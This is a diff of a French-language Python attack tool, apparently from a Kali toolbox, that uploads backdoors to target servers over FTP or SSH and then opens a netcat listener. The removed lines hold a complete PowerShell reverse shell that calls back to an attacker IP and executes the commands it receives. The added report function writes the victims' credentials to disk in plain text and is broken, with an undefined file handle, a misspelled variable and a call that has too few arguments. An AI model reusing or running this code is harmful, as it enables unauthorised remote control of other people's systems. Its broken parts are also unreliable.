@@ -1,70 +1,98 @@
 import ftplib
-import subprocess
+import paramiko
 import os
-import tempfile
+import subprocess
+import datetime
 
-def create_powershell_script():
-    """Crée le script PowerShell pour le reverse shell."""
-    powershell_script = """
-    $client = New-Object System.Net.Sockets.TCPClient('192.168.146.136',21); # IP de l'attaquant et port d'écoute
-    $stream = $client.GetStream();
-    [byte[]]$buffer = 0..65535|%{0};
-    while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
-        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);
-        $sendback = iex $data 2>&1 | Out-String;
-        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-        $stream.Write($sendbyte,0,$sendbyte.Length);
-        $stream.Flush();
-    };
-    $client.Close();
-    """
-    return powershell_script
+def list_backdoors():
+    backdoors_dir = '/home/kali/Documents/toolbox/tools/payloads/bibli_backdoor'
+    backdoors = os.listdir(backdoors_dir)
+    for idx, bd in enumerate(backdoors):
+        print(f"{idx + 1}. {bd}")
+    choice = int(input("Choisissez un fichier backdoor à déployer (numéro) : ")) - 1
+    return os.path.join(backdoors_dir, backdoors[choice])
 
-def deploy_backdoor(ftp_server, username, password, powershell_script, remote_file_path):
-    """Déploie la backdoor sur le serveur cible via FTP."""
+def deploy_backdoor_ftp(host, username, password, backdoor_path):
     try:
-        with ftplib.FTP(ftp_server) as ftp:
+        with ftplib.FTP(host) as ftp:
             ftp.login(username, password)
-            with tempfile.NamedTemporaryFile(delete=False, mode='w') as temp_file:
-                temp_file.write(powershell_script)
-                temp_file_path = temp_file.name
-            with open(temp_file_path, 'rb') as file:
-                ftp.storbinary(f'STOR {remote_file_path}', file)
-            os.unlink(temp_file_path)  # Supprimer le fichier temporaire
-        print("Backdoor deployed successfully.")
+            with open(backdoor_path, 'rb') as file:
+                ftp.storbinary('STOR ' + os.path.basename(backdoor_path), file)
+            print("Backdoor déployée avec succès via FTP.")
+            ftp.quit()
+            return True
     except Exception as e:
-        print(f"Failed to deploy backdoor: {e}")
+        print(f"Échec du déploiement via FTP: {e}")
         return False
-    return True
+
+def deploy_backdoor_ssh(host, username, password, backdoor_path):
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(host, username=username, password=password)
+        sftp = client.open_sftp()
+        sftp.put(backdoor_path, '/' + os.path.basename(backdoor_path))
+        sftp.close()
+        client.close()
+        print("Backdoor déployée avec succès via SSH.")
+        return True
+    except Exception as e:
+        print(f"Échec du déploiement via SSH: {e}")
+        return False
 
 def start_listener(port):
-    """Démarre un écouteur Netcat sur le port spécifié."""
     try:
+        print(f"Démarrage de l'écoute sur le port {port}...")
         subprocess.run(['nc', '-lvnp', str(port)])
+        return True
     except KeyboardInterrupt:
-        print("Listener stopped manually.")
+        print("Écoute interrompue manuellement.")
+        return False
     except Exception as e:
-        print(f"Error while listening: {e}")
+        print(f"Erreur pendant l'écoute : {e}")
+        return False
+
+def create_report(report_name, host, service_choice, username, password, backdoor_path, listener_port, deployment_success, listening_success):
+    f.write("\n\n****************************************************************\n")
+    f.write(f"Backdoor - - {host} - {service_choixe}\n")
+    f.write("****************************************************************\n")
+    report_content = f"Rapport de déploiement de backdoor - {datetime.datetime.now()}\n"
+    report_content += f"Service utilisé: {service_choice}\n"
+    report_content += f"Hôte cible: {host}\n"
+    report_content += f"Identifiant: {username}\n"
+    report_content += f"Mot de passe: {password}\n"
+    report_content += f"Fichier de backdoor déployé: {os.path.basename(backdoor_path)}\n"
+    report_content += f"Port d'écoute: {listener_port}\n"
+    report_content += f"Déploiement réussi: {'Oui' if deployment_success else 'Non'}\n"
+    report_content += f"Écoute réussie: {'Oui' if listening_success else 'Non'}\n"
+    with open(f"/home/kali/Documents/toolbox/rapports/{report_name}.txt", "w") as file:
+        file.write(report_content)
+    print(f"Rapport enregistré sous /home/kali/Documents/toolbox/rapports/{report_name}.txt")
 
 def reverse_shell():
-    ftp_server = input("Enter the FTP server IP: ")
-    username = input("Enter the FTP username: ")
-    password = input("Enter the FTP password: ")
-    
-    # Définir le chemin de déploiement de la backdoor à la racine de la connexion FTP
-    remote_file_path = "backdoor.ps1"  # Nom du fichier à la racine du FTP
+    print("""
+ ______  _______ _______ _     _ ______   _____   _____   ______                                                                                    
+ |_____] |_____| |       |____/  |     \ |     | |     | |_____/                                                                                    
+ |_____] |     | |_____  |    \_ |_____/ |_____| |_____| |    \_
+ """)
+    service_choice = input("Entrez le service à utiliser (ftp/ssh) : ")
+    host = input("Entrez l'IP du serveur : ")
+    username = input("Entrez le nom d'utilisateur : ")
+    password = input("Entrez le mot de passe : ")
+    listener_port = input("Entrez le port pour l'écoute de la backdoor : ")
+    backdoor_path = list_backdoors()
+    report_name = input("Entrez un nom pour le rapport : ")
 
-    listener_port = input("Enter the port to listen on for reverse shell: ")
-
-    # Script PowerShell encapsulé
-    powershell_script = create_powershell_script()
-
-    if deploy_backdoor(ftp_server, username, password, powershell_script, remote_file_path):
-        print("Starting listener for reverse shell...")
-        start_listener(listener_port)
+    if service_choice.lower() == 'ftp':
+        deploy_backdoor_ftp(host, username, password, backdoor_path)
+    elif service_choice.lower() == 'ssh':
+        deploy_backdoor_ssh(host, username, password, backdoor_path)
     else:
-        print("Failed to deploy the backdoor. Listener will not start.")
+        print("Service non reconnu.")
+        return
+
+    start_listener(listener_port)
+    create_report(report_name, host, service_choice, backdoor_path, listener_port)
 
 if __name__ == "__main__":
     reverse_shell()
